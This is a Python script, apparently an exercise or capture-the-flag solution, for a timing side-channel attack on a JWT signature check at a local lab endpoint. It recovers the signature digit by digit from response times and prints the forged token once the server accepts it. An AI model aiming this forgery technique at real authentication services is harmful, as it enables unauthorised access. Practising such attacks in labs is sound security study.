# NOTE: This is a work-in-progress. The script assumes that the longest running time is the correct guess,
# but this requires better statistical analysis

import time
import secrets
import requests
import base64
import json
import hmac
import hashlib
import operator
import pprint
import numpy as np
import getopt, sys

# best guest appends to this string until its 64 in length
bestGuessStr = ""

argumentList = sys.argv[1:]
options = "hx"
long_options = ["Help", "hash"]
try:
    arguments, values = getopt.getopt(argumentList, options, long_options)
    for currentArgument, currentValue in arguments:
 
        if currentArgument in ("-h", "--Help"):
            print ("Displaying Help\n Options: x partial hash to start")
        elif currentArgument in ("-x", "--hash"):
            print ("Using partial hash:", sys.argv[2])
            bestGuessStr = ''.join(sys.argv[2:])
except getopt.error as err:
    # output error, and return with an error code
    print (str(err))

# number of tries to iterate to determine the a good average
NUMBER_TRIES = 2

# actual endpoint to attack
URL = "http://127.0.0.1:1323/api/timing-answer"

session = requests.Session()

# hash is 32 bytes represented in hexidecimal, so any 16 random bytes can be converted with this function
def randomSecretAsHex():
    return secrets.token_bytes(32).hex()

def notSoRandomSecretAsHex():
    return "00" + secrets.token_bytes(30).hex() + "00"    

# takes dict and converts to JWT part
def createPart(dict):
    jsonStrBytes = json.dumps(
        dict, separators=(",", ":"), cls=None
    ).encode()
    return cleanBase64(jsonStrBytes)

def cleanBase64(byteStr):
    return base64.urlsafe_b64encode(byteStr).replace(b"=", b"")

def callAPI(url, secretHex):
    global session
    # print("calling with secret", secretHex)
    payload={}
    jsonHeader = {"alg":"CS256","typ":"JWT"}
    jsonPayload = { "exp" : 1739682651, "name" : "jiachengwu" }

    allParts = createPart(jsonHeader).decode("utf-8")  + "." + createPart(jsonPayload).decode("utf-8")
    signature = cleanBase64(bytes.fromhex(secretHex))

    headers = {
        'Authorization': 'Bearer ' + allParts + "." + signature.decode("utf-8") 
    }
    # print(headers)
    # response = requests.request("POST", url, headers=headers, data=payload)
    try:
        response = session.request("POST", url, headers=headers, data=payload)
        jsonResponseObj = json.loads(response.text)
        passed = True if jsonResponseObj['message'] == "Passed" else False
        if passed == True:
            print("token found", headers)
        return response.elapsed.total_seconds(), passed
    except ValueError:
        return 0, False

def averageTime(secretHex, regenerate = False):
    global session
    sumTimelapses = 0
    for x in range(0, NUMBER_TRIES):
        if regenerate == True:
            secretHex = notSoRandomSecretAsHex()
        # start = time.time()
        # perform the api request and check time lapsed
        totalTime, passed = callAPI(URL, secretHex)
        # end = time.time()
        sumTimelapses = sumTimelapses + (totalTime)
    return sumTimelapses/NUMBER_TRIES , passed

def sort_dict_by_value(d, reverse = False):
  return dict(sorted(d.items(), key = lambda x: x[1], reverse = reverse))

def makeAttemptWithPartialHash(knownHashPart):
    tempArr = {}
    for i in range (0, 16):
        unpaddedX = hex(i)[2:]
        tempArr[unpaddedX] = 0

    #for i in range (0, 256):
    for i in range (0, 16):
        unpaddedX = hex(i)[2:]
        # paddedX = unpaddedX.zfill(2)
        paddedX = unpaddedX
        print('[%s]\r'%paddedX, end="")
        paddedXWHash = knownHashPart + paddedX
        if len(paddedXWHash) > 64:
            paddedXWHash = paddedXWHash[0:64]
        fullSecret = paddedXWHash.ljust(64, "0")
        # print("i", i, "hex", hex(i), "secret", fullSecret)
        tempAvg, passed = averageTime(fullSecret, False)
        if passed == True:
            print("secret hash found", fullSecret)
            exit()
        # print(paddedX[:1], tempAvg)
        idx = paddedX[:1]
        tempArr[idx] = tempArr[idx] + tempAvg
    pp = pprint.PrettyPrinter(indent=4)
    pp.pprint(tempArr)

    listr = []
    # appending all the values in the list
    for value in tempArr.values():
        listr.append(value)
            
    # calculating standard deviation using np.std
    std = np.std(listr)
    print("standard deviation", std)
    average = np.average(listr)
    print("average   - ", average)
    max_key = max(tempArr, key=tempArr.get)
    print("guessed", max_key, '-', tempArr[max_key])
    return max_key

# first check the average time of random secrets
# actully it is no longer needed
# secretHex = notSoRandomSecretAsHex()
# avg = averageTime(secretHex, True)

# TODO: we need to do statistical analysis of each guess and evaluation the relationship of the standard dev to the average
while len(bestGuessStr) < 64:
    print("starting guess with", bestGuessStr)
    guessedValue = makeAttemptWithPartialHash(bestGuessStr)
    bestGuessStr = bestGuessStr + guessedValue
    print("guessed so far", bestGuessStr)





